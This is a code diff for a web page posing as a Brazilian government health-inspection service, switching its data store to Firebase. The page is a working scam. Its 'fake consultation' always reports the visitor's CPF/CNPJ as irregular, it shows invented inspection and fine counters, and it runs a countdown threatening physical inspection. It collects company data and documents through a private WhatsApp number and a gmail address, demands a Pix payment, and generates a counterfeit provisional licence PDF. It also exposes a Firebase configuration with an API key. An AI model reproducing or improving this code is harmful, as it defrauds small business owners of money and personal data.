@@ -696,9 +696,9 @@
 
                   <div class="qr-container">
                     <div id="cronometro-pix" style="font-size: 1.2rem; font-weight: 900; color: var(--sp-red); margin-bottom: 15px; background: #fff5f5; padding: 10px; border-radius: 8px;"></div>
-                     
+                      
                     <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
-                     
+                      
                     <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
@@ -909,9 +909,31 @@
     </form>
   </div>
 
-  <script>
+  <script type="module">
+    // 1. Importar o Firebase e o Firestore
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, doc, setDoc, getDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+  
+    // 2. Sua Configuração
+    const firebaseConfig = {
+      apiKey: "AIzaSyDm4YNEuPxXKQm5g_yPinNIcNNneLVf1Rg",
+      authDomain: "site-8dfaf.firebaseapp.com",
+      projectId: "site-8dfaf",
+      storageBucket: "site-8dfaf.firebasestorage.app",
+      messagingSenderId: "76689989548",
+      appId: "1:76689989548:web:5c86741e60ce385102a409"
+    };
+  
+    // 3. Iniciar o Banco
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+  
+    // --- VARIÁVEIS GLOBAIS ---
     window.captchaValidado = false;
-     
+    let cnpjParaComprovante = "";
+    let timerInterval;
+  
+    // --- FUNÇÕES DE UTILIDADE ---
     window.ativarCaptcha = function() {
         if(window.captchaValidado) return;
         document.getElementById('captcha-spinner').style.display = 'block';
@@ -922,7 +944,7 @@
             window.captchaValidado = true;
         }, 1200);
     };
-
+  
     window.maskCPFinCNPJ = function(i) {
       let v = i.value.replace(/\D/g,'');
       if (v.length <= 11) { 
@@ -937,7 +959,7 @@
       }
       i.value = v;
     };
-
+  
     window.validarCPF = function(cpf) {
       if (cpf == "00000000000" || cpf == "11111111111") return false;
       let add = 0;
@@ -952,12 +974,13 @@
       if (rev != parseInt(cpf.charAt(10))) return false;
       return true;
     };
-
+  
+    // Rascunho local
     window.salvarRascunho = function() {
       const nome = document.getElementById('nome_empresa').value;
       if(nome) localStorage.setItem('rascunho_nome', nome);
     };
-
+  
     window.limparCamposEndereco = function() {
       document.getElementById('nome_empresa').value = '';
       document.getElementById('end_rua').value = '';
@@ -970,26 +993,26 @@
       document.getElementById('google-map-frame').src = '';
       localStorage.removeItem('rascunho_nome');
     };
-
+  
     window.realizarConsultaFake = function() {
       const input = document.getElementById('fake_consulta_cnpj').value;
       if(input.length < 5) { alert("Digite um CPF/CNPJ válido."); return; }
-       
+        
       let res = document.getElementById('fake_consulta_resultado');
       res.style.display = 'block';
       res.style.background = '#e0f2fe'; res.style.color = '#0369a1';
       res.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Buscando no sistema de fiscalização estadual...';
-       
+        
       setTimeout(() => {
         res.style.background = '#fee2e2';
         res.style.color = '#b91c1c';
         res.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <strong>STATUS: PENDENTE DE REGULARIZAÇÃO</strong><br><span style="font-size:0.95rem; font-weight:normal; display:block; margin-top:5px;">Este CPF/CNPJ encontra-se irregular e sujeito a notificação. <a href="#regularize" style="color: #991b1b; text-decoration: underline; font-weight: 900;">Clique aqui e Regularize agora</a>.</span>';
       }, 1500);
     };
-
+  
     window.openDrawer = function() { document.getElementById('drawer').classList.add('open'); document.getElementById('drawerOverlay').classList.add('open'); document.body.style.overflow = 'hidden'; };
     window.closeDrawer = function() { document.getElementById('drawer').classList.remove('open'); document.getElementById('drawerOverlay').classList.remove('open'); document.body.style.overflow = ''; };
-     
+      
     let cliquesLogo = 0; let timerCliques;
     window.acessoAdmin = function() {
       cliquesLogo++; clearTimeout(timerCliques);
@@ -1001,7 +1024,7 @@
       }
       timerCliques = setTimeout(() => cliquesLogo = 0, 1500);
     };
-
+  
     window.alternarAba = function(aba) {
       document.getElementById('tab-envio').classList.remove('active');
       document.getElementById('tab-pagamento').classList.remove('active');
@@ -1010,7 +1033,7 @@
       document.getElementById('tab-' + aba).classList.add('active');
       document.getElementById('area-' + aba).style.display = 'block';
     };
-
+  
     window.toggleUpload = function(el) {
       const fileInput = el.closest('.doc-wrapper').querySelector('.file-upload');
       if (el.checked) {
@@ -1021,12 +1044,12 @@
       }
       window.calcularRisco();
     };
-
+  
     window.calcularRisco = function() {
       let divRisco = document.getElementById('risco-multa');
       divRisco.style.display = 'block';
       let naoMarcados = document.querySelectorAll('.doc-check:not(:checked)').length;
-       
+        
       if(naoMarcados === 0) {
         divRisco.style.background = '#dcfce3'; divRisco.style.color = '#166534';
         divRisco.innerHTML = '<i class="fas fa-shield-alt"></i> Tudo OK! Regularize agora para manter a segurança do CPF/CNPJ.';
@@ -1035,7 +1058,7 @@
         divRisco.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <strong>Atenção às Pendências Documentais</strong><br><span style="font-weight:normal; font-size:0.9rem;">Faltam documentos importantes. Recomendamos o envio para análise e a regularização da taxa, evitando assim notificações, sanções legais e travando possíveis multas.</span>`;
       }
     };
-
+  
     function criarDocItem(valor, icone, titulo) {
       return `
         <div class="doc-wrapper" style="display:flex; flex-direction:column; gap:8px;">
@@ -1047,17 +1070,17 @@
         </div>
       `;
     }
-
+  
     window.mostrarChecklist = function() {
       const tipo = document.getElementById('tipo_estab').value;
       const listaDocs = document.getElementById('lista-documentos');
       if (!tipo) return;
-
+  
       const docsComuns = criarDocItem("CNPJ Ativo", "fa-file-invoice", "CNPJ Ativo") +
                          criarDocItem("Contrato Social / MEI", "fa-file-contract", "Contrato / MEI") +
                          criarDocItem("Alvará de Funcionamento", "fa-building", "Alvará Prefeitura") +
                          criarDocItem("AVCB Bombeiros", "fa-fire-extinguisher", "AVCB (Bombeiros)");
-
+  
       let docsEspecificos = "";
       if (tipo === "Alimentos") {
         docsEspecificos = criarDocItem("Limpeza Caixa D'água", "fa-tint", "Limpeza Caixa") +
@@ -1079,13 +1102,13 @@
                           criarDocItem("Controle Pragas", "fa-bug", "Controle Pragas") +
                           criarDocItem("Laudo de Ruído", "fa-volume-up", "Laudo Ruído");
       }
-
+  
       listaDocs.innerHTML = docsComuns + docsEspecificos;
       document.getElementById('area-checklist').style.display = 'block';
       document.getElementById('btn-enviar-whatsapp').style.display = 'flex';
       window.calcularRisco();
     };
-
+  
     window.copiarPix = function() {
       const pixInput = document.getElementById('pix-copia-cola');
       pixInput.select();
@@ -1093,134 +1116,49 @@
       navigator.clipboard.writeText(pixInput.value);
       alert("Código Pix copiado com sucesso!");
     };
-
-    window.enviarWhatsAppComprovanteConsulta = function() {
+  
+    // --- NOVA FUNÇÃO DE ENVIO COM FIREBASE (ADMIN VAI VER) ---
+    window.enviarWhatsAppComprovanteConsulta = async function() {
       if(!cnpjParaComprovante) return;
-      let pedidos = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
-      let pedido = pedidos[cnpjParaComprovante] || {};
-      const msg = `*COMPROVANTE DE PAGAMENTO*\n\n*Empresa/Pessoa:* ${pedido.nome || 'Não identificado'}\n*CNPJ/CPF:* ${cnpjParaComprovante}\nEstou enviando o comprovante do pagamento para liberação da minha licença no sistema!`;
-      enviarWhatsApp(msg);
+      
+      // Busca dados atualizados do Firebase
+      const docRef = doc(db, "pedidos", cnpjParaComprovante);
+      const docSnap = await getDoc(docRef);
+      
+      if (docSnap.exists()) {
+          const pedido = docSnap.data();
+          const msg = `*COMPROVANTE DE PAGAMENTO*\n\n*Empresa/Pessoa:* ${pedido.nome || 'Não identificado'}\n*CNPJ/CPF:* ${cnpjParaComprovante}\nEstou enviando o comprovante do pagamento para liberação da minha licença no sistema!`;
+          window.enviarWhatsApp(msg);
+      }
     };
-
+  
     window.enviarAssinaturaEmail = function() {
       const cnpj = document.getElementById('consulta_cnpj').value || 'Não Informado';
       alert('Atenção: Será aberto o seu aplicativo de e-mail. Por favor, ANEXE o arquivo que você acabou de selecionar lá no e-mail antes de enviar!');
       window.location.href = 'mailto:vigilanciasanitariaspgov1@gmail.com?subject=Documento Assinado - CNPJ ' + cnpj + '&body=Olá,%0D%0A%0D%0ASegue em anexo o certificado provisório devidamente assinado para validação no sistema.';
     };
-
+  
     window.verificarOutros = function(sel) {
       const campoOutros = document.getElementById('resumo_outros');
       campoOutros.style.display = sel.value === 'Outros' ? 'block' : 'none';
       campoOutros.required = sel.value === 'Outros';
     };
-
+  
     window.countChars = function(obj) { 
         document.getElementById("charNum").innerHTML = obj.value.length; 
     };
-
+  
     window.toggleChat = function() {
       const c = document.getElementById('chat-interface');
       c.style.display = c.style.display === 'flex' ? 'none' : 'flex';
     };
-
-    window.gerarPDF = async function() {
-      const btn = document.getElementById('btn-baixar-pdf');
-      const textoOriginal = btn.innerHTML;
-      try {
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando documento...';
-        btn.disabled = true;
-
-        const cnpj = document.getElementById('consulta_cnpj').value;
-        const db = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
-        const dados = db[cnpj] || {};
-
-        const nomeEmpresa = (dados.nome || "EMPRESA NÃO IDENTIFICADA").toUpperCase();
-        const docCnpj = cnpj;
-
-        const hoje = new Date();
-        const dataEmissao = hoje.toLocaleDateString('pt-BR');
-        const dataV = new Date();
-        dataV.setFullYear(hoje.getFullYear() + 1);
-        const dataValidade = dataV.toLocaleDateString('pt-BR');
-
-        // Adicionei timestamp para evitar cache do navegador e garantir que pegue o novo script
-        const url = 'Alvara Provisório.pdf?v=' + new Date().getTime(); 
-        const existingPdfBytes = await fetch(url).then(res => res.arrayBuffer());
-
-        const { PDFDocument, StandardFonts } = PDFLib;
-        const pdfDoc = await PDFDocument.load(existingPdfBytes);
-         
-        const fontNormal = await pdfDoc.embedFont(StandardFonts.TimesRoman);
-        const fontBold = await pdfDoc.embedFont(StandardFonts.TimesRomanBold);
-
-        const page = pdfDoc.getPages()[0];
-         
-        // --- CORREÇÃO DE ALINHAMENTO DEFINITIVA ---
-        const startX = 20;
-        // Ajuste Y: 538 (Para encostar na linha de cima e sair da de baixo)
-        const startY = 538; 
-        const espacoY = 18; 
-        // Ajuste X: 175 (Para afastar da etiqueta "RAZÃO SOCIAL:")
-        const valorX = 175; 
-
-        page.drawText(`RAZÃO SOCIAL:`, { x: startX, y: startY, size: 10, font: fontNormal });
-        page.drawText(`${nomeEmpresa}`, { x: valorX, y: startY, size: 10, font: fontBold });
-
-        page.drawText(`CNPJ:`, { x: startX, y: startY - espacoY, size: 10, font: fontNormal });
-        page.drawText(`${docCnpj}`, { x: valorX, y: startY - espacoY, size: 10, font: fontBold });
-
-        page.drawText(`DATA DE EMISSÃO:`, { x: startX, y: startY - (espacoY * 2), size: 10, font: fontNormal });
-        page.drawText(`${dataEmissao}`, { x: valorX, y: startY - (espacoY * 2), size: 10, font: fontBold });
-
-        page.drawText(`VÁLIDO ATÉ:`, { x: startX, y: startY - (espacoY * 3), size: 10, font: fontNormal });
-        page.drawText(`${dataValidade}`, { x: valorX, y: startY - (espacoY * 3), size: 10, font: fontBold });
-        
-        // --- CORREÇÃO DA DATA DE BAIXO ---
-        // Y = 88 (Altura aprovada)
-        // X = 335 (Empurrando para a direita)
-        page.drawText(`DATA: ${dataEmissao}`, { x: 335, y: 88, size: 12, font: fontBold });
-
-        const pdfBytes = await pdfDoc.save();
-        download(pdfBytes, `Licenca_${docCnpj}.pdf`, "application/pdf");
-
-        btn.innerHTML = textoOriginal;
-        btn.disabled = false;
-      } catch (err) {
-        console.error(err);
-        alert("Erro: Arquivo 'Alvara Provisório.pdf' não encontrado na pasta do site.");
-        btn.innerHTML = textoOriginal;
-        btn.disabled = false;
-      }
-    };
-
-    // --- EVENTOS QUE PRECISAM CARREGAR JUNTO COM A PÁGINA ---
-    document.addEventListener('DOMContentLoaded', () => {
-
-      if(localStorage.getItem('rascunho_nome')) {
-        document.getElementById('nome_empresa').value = localStorage.getItem('rascunho_nome');
-      }
-
-      function atualizarDadosReais() {
-        const hora = new Date().getHours();
-        document.getElementById('count-fiscal').innerText = 1246 + Math.floor(hora / 8);
-        document.getElementById('count-multa').innerText = Math.min(30, Math.floor((hora / 24) * 25) + Math.floor(Math.random() * 5));
-      }
-      atualizarDadosReais();
-
-      document.querySelectorAll('.faq-question').forEach(q => {
-        q.addEventListener('click', () => {
-          const item = q.parentElement; item.classList.toggle('active');
-          const ans = item.querySelector('.faq-answer');
-          ans.style.maxHeight = item.classList.contains('active') ? ans.scrollHeight + "px" : null;
-        });
-      });
-
-      function enviarWhatsApp(texto) {
+  
+    window.enviarWhatsApp = function(texto) {
         const url = "https://api.whatsapp.com/send?phone=5511920665012&text=" + encodeURIComponent(texto);
         window.open(url, '_blank');
-      }
-
-      function atualizarBarraProgresso(step) {
+    };
+  
+    window.atualizarBarraProgresso = function(step) {
         document.getElementById('barra-progresso').style.display = 'flex';
         for(let i=1; i<=4; i++) {
           let el = document.getElementById('step-' + i);
@@ -1228,12 +1166,9 @@
           if(i < step) el.classList.add('completed');
           if(i === step) el.classList.add('active');
         }
-      }
-
-      let cnpjParaComprovante = "";
-      let timerInterval;
-
-      function iniciarCronometroPix() {
+    };
+  
+    window.iniciarCronometroPix = function() {
         clearInterval(timerInterval);
         let time = 1800; 
         let display = document.getElementById('cronometro-pix');
@@ -1248,9 +1183,93 @@
             display.textContent = "Tempo expirado! Sujeito a fiscalização física.";
           }
         }, 1000);
+    };
+  
+    // --- GERAÇÃO DE PDF (COM FIREBASE) ---
+    window.gerarPDF = async function() {
+      const btn = document.getElementById('btn-baixar-pdf');
+      const textoOriginal = btn.innerHTML;
+      try {
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando documento...';
+        btn.disabled = true;
+  
+        const cnpj = document.getElementById('consulta_cnpj').value;
+        
+        // Busca dados do Firebase
+        const docRef = doc(db, "pedidos", cnpj);
+        const docSnap = await getDoc(docRef);
+        
+        if (!docSnap.exists()) { throw new Error("Cadastro não encontrado"); }
+        const dados = docSnap.data();
+  
+        const nomeEmpresa = (dados.nome || "EMPRESA NÃO IDENTIFICADA").toUpperCase();
+        const docCnpj = cnpj;
+        const hoje = new Date();
+        const dataEmissao = hoje.toLocaleDateString('pt-BR');
+        const dataV = new Date();
+        dataV.setFullYear(hoje.getFullYear() + 1);
+        const dataValidade = dataV.toLocaleDateString('pt-BR');
+  
+        const url = 'Alvara Provisório.pdf?v=' + new Date().getTime(); 
+        const existingPdfBytes = await fetch(url).then(res => res.arrayBuffer());
+  
+        // Usa o PDFLib que foi carregado no Head
+        const { PDFDocument, StandardFonts } = window.PDFLib;
+        const pdfDoc = await PDFDocument.load(existingPdfBytes);
+        const fontNormal = await pdfDoc.embedFont(StandardFonts.TimesRoman);
+        const fontBold = await pdfDoc.embedFont(StandardFonts.TimesRomanBold);
+        const page = pdfDoc.getPages()[0];
+        
+        const startX = 20;
+        const startY = 538; 
+        const espacoY = 18; 
+        const valorX = 175; 
+  
+        page.drawText(`RAZÃO SOCIAL:`, { x: startX, y: startY, size: 10, font: fontNormal });
+        page.drawText(`${nomeEmpresa}`, { x: valorX, y: startY, size: 10, font: fontBold });
+        page.drawText(`CNPJ:`, { x: startX, y: startY - espacoY, size: 10, font: fontNormal });
+        page.drawText(`${docCnpj}`, { x: valorX, y: startY - espacoY, size: 10, font: fontBold });
+        page.drawText(`DATA DE EMISSÃO:`, { x: startX, y: startY - (espacoY * 2), size: 10, font: fontNormal });
+        page.drawText(`${dataEmissao}`, { x: valorX, y: startY - (espacoY * 2), size: 10, font: fontBold });
+        page.drawText(`VÁLIDO ATÉ:`, { x: startX, y: startY - (espacoY * 3), size: 10, font: fontNormal });
+        page.drawText(`${dataValidade}`, { x: valorX, y: startY - (espacoY * 3), size: 10, font: fontBold });
+        page.drawText(`DATA: ${dataEmissao}`, { x: 335, y: 88, size: 12, font: fontBold });
+  
+        const pdfBytes = await pdfDoc.save();
+        download(pdfBytes, `Licenca_${docCnpj}.pdf`, "application/pdf");
+  
+        btn.innerHTML = textoOriginal;
+        btn.disabled = false;
+      } catch (err) {
+        console.error(err);
+        alert("Erro ao gerar PDF: Verifique se o arquivo base existe ou tente novamente.");
+        btn.innerHTML = textoOriginal;
+        btn.disabled = false;
       }
-
-      // Validação em tempo real do CPF/CNPJ com lógica de limpeza
+    };
+  
+    // --- EVENT LISTENER DO DOM ---
+    document.addEventListener('DOMContentLoaded', () => {
+  
+      if(localStorage.getItem('rascunho_nome')) {
+        document.getElementById('nome_empresa').value = localStorage.getItem('rascunho_nome');
+      }
+  
+      function atualizarDadosReais() {
+        const hora = new Date().getHours();
+        document.getElementById('count-fiscal').innerText = 1246 + Math.floor(hora / 8);
+        document.getElementById('count-multa').innerText = Math.min(30, Math.floor((hora / 24) * 25) + Math.floor(Math.random() * 5));
+      }
+      atualizarDadosReais();
+  
+      document.querySelectorAll('.faq-question').forEach(q => {
+        q.addEventListener('click', () => {
+          const item = q.parentElement; item.classList.toggle('active');
+          const ans = item.querySelector('.faq-answer');
+          ans.style.maxHeight = item.classList.contains('active') ? ans.scrollHeight + "px" : null;
+        });
+      });
+  
       const docInput = document.getElementById('cnpj_empresa');
       docInput.addEventListener('keyup', async function(e) {
           let valLimpo = this.value.replace(/\D/g, '');
@@ -1265,15 +1284,13 @@
               let erroAntigo = document.getElementById('erro-cpf-msg');
               if(erroAntigo) erroAntigo.remove();
               docInput.style.borderColor = '#e9ecef';
-              
-              // RESETA todos os campos caso você apague os números e digite outro
               window.limparCamposEndereco();
           }
-
+  
           if (valLimpo.length === 11) {
               let erroAntigo = document.getElementById('erro-cpf-msg');
               if(erroAntigo) erroAntigo.remove();
-
+  
               if (window.validarCPF(valLimpo)) {
                   this.style.borderColor = '#2e7d32'; 
                   document.getElementById('nome_empresa').removeAttribute('required');
@@ -1296,7 +1313,6 @@
                   msgErro.style.fontWeight = 'bold';
                   msgErro.style.marginTop = '5px';
                   msgErro.innerHTML = '<i class="fas fa-times-circle"></i> CPF Inválido ou Inexistente.';
-                  
                   if(!document.getElementById('erro-cpf-msg')) {
                       this.parentNode.insertBefore(msgErro, this.nextSibling);
                   }
@@ -1307,167 +1323,155 @@
               if(erroAntigo) erroAntigo.remove();
               this.style.borderColor = '#e9ecef';
               document.getElementById('nome_empresa').setAttribute('required', 'true');
-
               document.getElementById('loading-cnpj').style.display = 'block';
               
               try {
-                // Antes de puxar novos dados, limpa os antigos
                 window.limparCamposEndereco();
-                
                 let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${valLimpo}`);
                 let dados = await req.json();
-                
                 if(dados.razao_social) {
                   document.getElementById('dados-pj').style.display = 'block';
                   document.getElementById('nome_empresa').value = dados.nome_fantasia || dados.razao_social;
-                  
                   document.getElementById('endereco-automatico').style.display = 'block';
                   document.getElementById('end_rua').value = dados.logradouro;
                   document.getElementById('end_num').value = dados.numero;
                   document.getElementById('end_bairro').value = dados.bairro;
                   document.getElementById('end_cidade').value = dados.municipio + " - " + dados.uf;
-
-                  // Atualização do link do Mapa para a versão que funciona perfeitamente no iFrame
+  
                   const enderecoCompleto = `${dados.logradouro}, ${dados.numero}, ${dados.municipio}, ${dados.uf}`;
                   const mapUrl = `http://googleusercontent.com/maps.google.com/maps?q=${encodeURIComponent(enderecoCompleto)}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
-                  
                   document.getElementById('map-container').style.display = 'block';
                   document.getElementById('google-map-frame').src = mapUrl;
-
                   window.salvarRascunho();
                 }
               } catch(error) { console.log("Erro ao buscar CNPJ"); }
               document.getElementById('loading-cnpj').style.display = 'none';
           }
       });
-
-      // Submit do Formulário de Regularização
-      document.getElementById('form-regularizacao').addEventListener('submit', (e) => {
+  
+      // --- SUBMIT DO FORMULÁRIO (SALVA NO FIREBASE) ---
+      document.getElementById('form-regularizacao').addEventListener('submit', async (e) => {
         e.preventDefault();
         
-        if(!window.captchaValidado) {
-            alert("Por favor, confirme que você não é um robô.");
-            return;
-        }
-
+        if(!window.captchaValidado) { alert("Por favor, confirme que você não é um robô."); return; }
+  
         const todasOpcoes = document.querySelectorAll('.doc-check');
         const marcados = []; const naoMarcados = [];
-        let erroUpload = false;
-        let nomeDocErro = "";
-
+        let erroUpload = false; let nomeDocErro = "";
+  
         todasOpcoes.forEach(el => {
           if(el.checked) {
               marcados.push(el.value);
               const fileInput = el.closest('.doc-wrapper').querySelector('.file-upload input[type="file"]');
               const nomeDoc = el.nextElementSibling.nextElementSibling.innerText;
-              if(fileInput && fileInput.files.length === 0) {
-                  erroUpload = true;
-                  nomeDocErro = nomeDoc;
-              }
-          }
-          else {
-              naoMarcados.push(el.value);
-          }
+              if(fileInput && fileInput.files.length === 0) { erroUpload = true; nomeDocErro = nomeDoc; }
+          } else { naoMarcados.push(el.value); }
         });
-
-        if(erroUpload) {
-            alert(`ERRO DE SEGURANÇA:\nVocê marcou que possui "${nomeDocErro}", mas não anexou a foto.\nAnexe o arquivo ou desmarque a opção.`);
-            return;
-        }
-
-        if (marcados.length === 0 && todasOpcoes.length > 0) {
-          alert("Atenção: Você precisa selecionar pelo menos um documento que já possui e anexar o arquivo antes de enviar os dados para análise.");
-          return; 
-        }
-
+  
+        if(erroUpload) { alert(`ERRO DE SEGURANÇA:\nVocê marcou que possui "${nomeDocErro}", mas não anexou a foto.`); return; }
+        if (marcados.length === 0 && todasOpcoes.length > 0) { alert("Selecione pelo menos um documento."); return; }
+  
         const nomePJ = document.getElementById('nome_empresa').value;
         const nomePF = document.getElementById('nome_pf').value;
         const nomeFantasiaPF = document.getElementById('nome_fantasia_pf').value;
         const nomeFinal = nomePJ || (nomePF + (nomeFantasiaPF ? " (" + nomeFantasiaPF + ")" : "")) || "Cidadão";
-              
         const cnpj = document.getElementById('cnpj_empresa').value;
         const tipo = document.getElementById('tipo_estab').value;
-
+  
         const docsTextAdmin = `POSSUI E ANEXOU: ${marcados.join(", ")}\n\nFALTA PROVIDENCIAR: ${naoMarcados.length > 0 ? naoMarcados.join(", ") : "Nenhum"}`;
-
-        let pedidos = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
-        pedidos[cnpj] = { nome: nomeFinal, tipo: tipo, docs: docsTextAdmin, valor: null, pago: false, data: new Date().toLocaleString() };
-        localStorage.setItem('covisa_pedidos', JSON.stringify(pedidos));
-
-        const protocolo = "DIA-" + Math.floor(1000 + Math.random() * 9000);
-        let msg = `*NOVO ENVIO DE DOCUMENTAÇÃO*\n\n*Protocolo:* ${protocolo}\n*Nome/Razão:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n*Ramo:* ${tipo}\n\n`;
-        msg += `✅ *POSSUI E ANEXOU:*\n- ${marcados.join('\n- ')}\n\n`;
-        msg += `🚨 *FALTA PROVIDENCIAR:*\n${naoMarcados.length > 0 ? '❌ ' + naoMarcados.join('\n❌ ') : 'Nenhuma pendência'}\n\nAguardo a emissão da taxa.`;
-
-        enviarWhatsApp(msg);
-        alert("Formulário e arquivos enviados! Fique atento às pendências. Acompanhe a liberação da taxa na próxima tela.");
-        
-        document.getElementById('form-regularizacao').reset();
-        document.getElementById('area-checklist').style.display = 'none';
-        document.getElementById('btn-enviar-whatsapp').style.display = 'none';
-        window.limparCamposEndereco();
-        
-        window.alternarAba('pagamento');
-        document.getElementById('consulta_cnpj').value = cnpj;
+  
+        // SALVAR NO FIREBASE
+        try {
+            await setDoc(doc(db, "pedidos", cnpj), {
+                nome: nomeFinal,
+                tipo: tipo,
+                docs: docsTextAdmin,
+                valor: null,
+                pago: false,
+                data: new Date().toLocaleString()
+            });
+  
+            const protocolo = "DIA-" + Math.floor(1000 + Math.random() * 9000);
+            let msg = `*NOVO ENVIO DE DOCUMENTAÇÃO*\n\n*Protocolo:* ${protocolo}\n*Nome/Razão:* ${nomeFinal}\n*CNPJ/CPF:* ${cnpj}\n*Ramo:* ${tipo}\n\n`;
+            msg += `✅ *POSSUI E ANEXOU:*\n- ${marcados.join('\n- ')}\n\n`;
+            msg += `🚨 *FALTA PROVIDENCIAR:*\n${naoMarcados.length > 0 ? '❌ ' + naoMarcados.join('\n❌ ') : 'Nenhuma pendência'}\n\nAguardo a emissão da taxa.`;
+  
+            window.enviarWhatsApp(msg);
+            alert("Dados enviados com sucesso para a Central! Acompanhe a liberação na próxima tela.");
+            
+            document.getElementById('form-regularizacao').reset();
+            document.getElementById('area-checklist').style.display = 'none';
+            document.getElementById('btn-enviar-whatsapp').style.display = 'none';
+            window.limparCamposEndereco();
+            
+            window.alternarAba('pagamento');
+            document.getElementById('consulta_cnpj').value = cnpj;
+            
+        } catch (error) {
+            console.error("Erro ao salvar no Firebase:", error);
+            alert("Erro de conexão. Tente novamente.");
+        }
       });
-
-      // Submit do Formulário de Consulta de Guia/Pix
+  
+      // --- CONSULTA EM TEMPO REAL NO FIREBASE ---
       document.getElementById('form-consulta').addEventListener('submit', (e) => {
         e.preventDefault();
         const cnpj = document.getElementById('consulta_cnpj').value;
         const divPix = document.getElementById('resultado-pix');
         const divMsg = document.getElementById('mensagem-status');
         const textMsg = document.getElementById('texto-mensagem');
-
-        let pedidos = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
-        let pedido = pedidos[cnpj];
-
-        if (!pedido) {
-          divPix.style.display = 'none'; divMsg.style.display = 'block';
-          divMsg.style.background = '#fff3cd'; divMsg.style.color = '#856404'; divMsg.style.borderColor = '#f59e0b';
-          textMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Nenhum cadastro encontrado para este CNPJ/CPF.';
-          document.getElementById('barra-progresso').style.display = 'none';
-        } 
-        else if (pedido.pago === true) {
-          divPix.style.display = 'none'; divMsg.style.display = 'block';
-          divMsg.style.background = '#dcfce3'; divMsg.style.color = '#166534'; divMsg.style.borderColor = '#10b981';
-          textMsg.innerHTML = `
-            <i class="fas fa-check-circle" style="font-size:1.5rem; margin-bottom: 10px;"></i><br>
-            <strong style="font-size:1.3rem;">Taxa Regularizada!</strong><br><br>
-            Seu processo foi concluído com sucesso e as pendências foram baixadas no sistema.
-            <div style="background: #fff; padding: 20px; border-radius: 8px; border: 1px solid #e2e8f0; margin-top: 20px;">
-              <button id="btn-baixar-pdf" class="btn-primary" style="margin-bottom: 20px;" onclick="window.gerarPDF()">
-                <i class="fas fa-file-pdf"></i> Baixar Licença Provisória
-              </button>
-              <p style="font-size:0.85rem; color:#64748b; font-weight:800; margin-bottom:10px; border-top: 1px solid #eee; padding-top: 15px;">PASSO FINAL OBRIGATÓRIO:</p>
-              <p style="font-size:0.9rem; margin-bottom:15px; color:#333;">Imprima, assine o documento e anexe-o clicando no botão abaixo.</p>
-              <label for="upload-assinado" class="btn-success" style="cursor:pointer; display:flex; font-size: 1rem; padding: 16px; background: #1a73e8; border-radius: 8px; color: white; justify-content: center; gap: 10px;">
-                <i class="fas fa-envelope"></i> Enviar Documento Assinado
-              </label>
-              <input type="file" id="upload-assinado" style="display:none;" accept="application/pdf, image/*" onchange="window.enviarAssinaturaEmail()">
-            </div>
-          `;
-          atualizarBarraProgresso(4); 
-        } 
-        else if (pedido.valor === null || pedido.valor === "") {
-          divPix.style.display = 'none'; divMsg.style.display = 'block';
-          divMsg.style.background = '#fffbeb'; divMsg.style.color = '#b45309'; divMsg.style.borderColor = '#f59e0b';
-          textMsg.innerHTML = '<i class="fas fa-search-location" style="font-size:1.5rem; margin-bottom: 10px;"></i><br><strong>Análise em Andamento</strong><br>Sua documentação está sendo analisada pelos fiscais de plantão. Volte a consultar em alguns instantes.';
-          atualizarBarraProgresso(2); 
-        } 
-        else {
-          divMsg.style.display = 'none'; divPix.style.display = 'block';
-          let valorFormatado = parseFloat(pedido.valor).toLocaleString('pt-BR', {style: 'currency', currency: 'BRL'});
-          if(valorFormatado === "NaN" || !pedido.valor.match(/[0-9]/)) valorFormatado = "R$ " + pedido.valor;
-          document.getElementById('valor-cobrado').innerText = valorFormatado;
-          cnpjParaComprovante = cnpj;
-          
-          atualizarBarraProgresso(3); 
-          iniciarCronometroPix(); 
-        }
+  
+        // Escuta as mudanças no documento específico em Tempo Real
+        onSnapshot(doc(db, "pedidos", cnpj), (docSnap) => {
+            if (!docSnap.exists()) {
+              divPix.style.display = 'none'; divMsg.style.display = 'block';
+              divMsg.style.background = '#fff3cd'; divMsg.style.color = '#856404'; divMsg.style.borderColor = '#f59e0b';
+              textMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Nenhum cadastro encontrado para este CNPJ/CPF.';
+              document.getElementById('barra-progresso').style.display = 'none';
+            } else {
+              const pedido = docSnap.data();
+  
+              if (pedido.pago === true) {
+                divPix.style.display = 'none'; divMsg.style.display = 'block';
+                divMsg.style.background = '#dcfce3'; divMsg.style.color = '#166534'; divMsg.style.borderColor = '#10b981';
+                textMsg.innerHTML = `
+                  <i class="fas fa-check-circle" style="font-size:1.5rem; margin-bottom: 10px;"></i><br>
+                  <strong style="font-size:1.3rem;">Taxa Regularizada!</strong><br><br>
+                  Seu processo foi concluído com sucesso e as pendências foram baixadas no sistema.
+                  <div style="background: #fff; padding: 20px; border-radius: 8px; border: 1px solid #e2e8f0; margin-top: 20px;">
+                    <button id="btn-baixar-pdf" class="btn-primary" style="margin-bottom: 20px;" onclick="window.gerarPDF()">
+                      <i class="fas fa-file-pdf"></i> Baixar Licença Provisória
+                    </button>
